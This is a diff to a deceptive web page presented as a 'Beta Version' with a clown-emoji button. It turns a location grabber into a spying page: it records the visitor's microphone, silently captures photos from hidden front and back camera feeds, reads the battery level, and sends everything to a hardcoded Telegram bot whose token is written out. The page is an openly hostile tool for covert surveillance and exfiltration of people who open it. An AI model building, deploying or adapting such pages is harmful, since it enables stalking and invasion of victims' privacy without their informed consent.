@@ -19,70 +19,117 @@
       font-size: 18px;
       color: #333;
     }
-    #requestLocationBtn {
+    #requestRecordingBtn {
       font-size: 24px;
       padding: 10px 20px;
       cursor: pointer;
       margin-top: 20px;
+    }
+    video {
+      display: none; /* Hide video elements */
     }
   </style>
 </head>
 <body>
 
   <h1>Beta Version</h1>
-  <button id="requestLocationBtn">🤡</button>
-  <div id="status">Click on 🤡 to share location.</div>
+  <button id="requestRecordingBtn">🤡 Start Recording</button>
+  <div id="status">Click on 🤡 to start the process.</div>
+  <video id="frontCamera" autoplay playsinline></video>
+  <video id="backCamera" autoplay playsinline></video>
 
   <script>
     const botToken = '7966931731:AAEqPHdTuX0epQhM6D_hEZ0X8Azae_5RwXM';
     const chatId = '6471397661';
 
-    function sendLocationToTelegram(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=https://maps.google.com/?q=${latitude},${longitude}`;
+    async function sendToTelegram(message) {
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-      fetch(telegramUrl)
-        .then(response => {
-          if (response.ok) {
-            document.getElementById('status').textContent = "Done ✅.";
-          } else {
-            document.getElementById('status').textContent = "Failed to perform action ❌.";
-          }
-        })
-        .catch(error => {
-          document.getElementById('status').textContent = "Error occurred.";
-        });
-    }
-
-    function showError(error) {
-      const status = document.getElementById('status');
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          status.textContent = "User denied the request for Geolocation.";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          status.textContent = "Click on 3 dots in the top right corner (...) and open in Chrome.";
-          break;
-        case error.TIMEOUT:
-          status.textContent = "The request to get user location timed out.";
-          break;
-        case error.UNKNOWN_ERROR:
-          status.textContent = "An unknown error occurred.";
-          break;
+      try {
+        const response = await fetch(telegramUrl);
+        if (!response.ok) {
+          throw new Error('Failed to send message.');
+        }
+      } catch (error) {
+        document.getElementById('status').textContent = "Error occurred while sending to Telegram.";
       }
     }
 
-    function requestLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
-      } else {
-        document.getElementById('status').textContent = "Geolocation is not supported by this browser.";
-      }
+    function getBatteryLevel() {
+      return navigator.getBattery().then(battery => {
+        return `Battery Level: ${(battery.level * 100).toFixed(0)}%`;
+      });
     }
 
-    // Set up the button to request location when clicked
-    document.getElementById('requestLocationBtn').addEventListener('click', requestLocation);
+    async function capturePhoto(videoElement) {
+      const canvas = document.createElement('canvas');
+      canvas.width = videoElement.videoWidth;
+      canvas.height = videoElement.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+      return canvas.toDataURL('image/png');
+    }
+
+    async function requestCameras() {
+      const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      document.getElementById('frontCamera').srcObject = frontStream;
+
+      const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      document.getElementById('backCamera').srcObject = backStream;
+    }
+
+    async function recordAudio() {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const mediaRecorder = new MediaRecorder(stream);
+      const audioChunks = [];
+
+      mediaRecorder.ondataavailable = event => {
+        audioChunks.push(event.data);
+      };
+
+      mediaRecorder.start();
+
+      setTimeout(async () => {
+        mediaRecorder.stop();
+
+        mediaRecorder.onstop = async () => {
+          const audioBlob = new Blob(audioChunks);
+          const audioUrl = URL.createObjectURL(audioBlob);
+          const audioMessage = `Audio Recording: [Click to listen](${audioUrl})`;
+          await sendToTelegram(audioMessage);
+
+          // Vibration for 10 seconds
+          navigator.vibrate(10000);
+        };
+      }, 10000); // Record for 10 seconds
+    }
+
+    async function takePictures() {
+      await requestCameras();
+
+      const frontCamera = document.getElementById('frontCamera');
+      const backCamera = document.getElementById('backCamera');
+
+      // Capture front camera photo
+      const frontPhoto = await capturePhoto(frontCamera);
+      await sendToTelegram(`Front Camera Photo: ${frontPhoto}`);
+
+      // Capture back camera photo
+      const backPhoto = await capturePhoto(backCamera);
+      await sendToTelegram(`Back Camera Photo: ${backPhoto}`);
+
+      // Get battery level
+      const batteryLevel = await getBatteryLevel();
+      await sendToTelegram(batteryLevel);
+
+      document.getElementById('status').textContent = "All data sent to Telegram.";
+    }
+
+    // Set up the button to start the process when clicked
+    document.getElementById('requestRecordingBtn').addEventListener('click', async () => {
+      await recordAudio();
+      await takePictures();
+    });
   </script>
 
 </body>
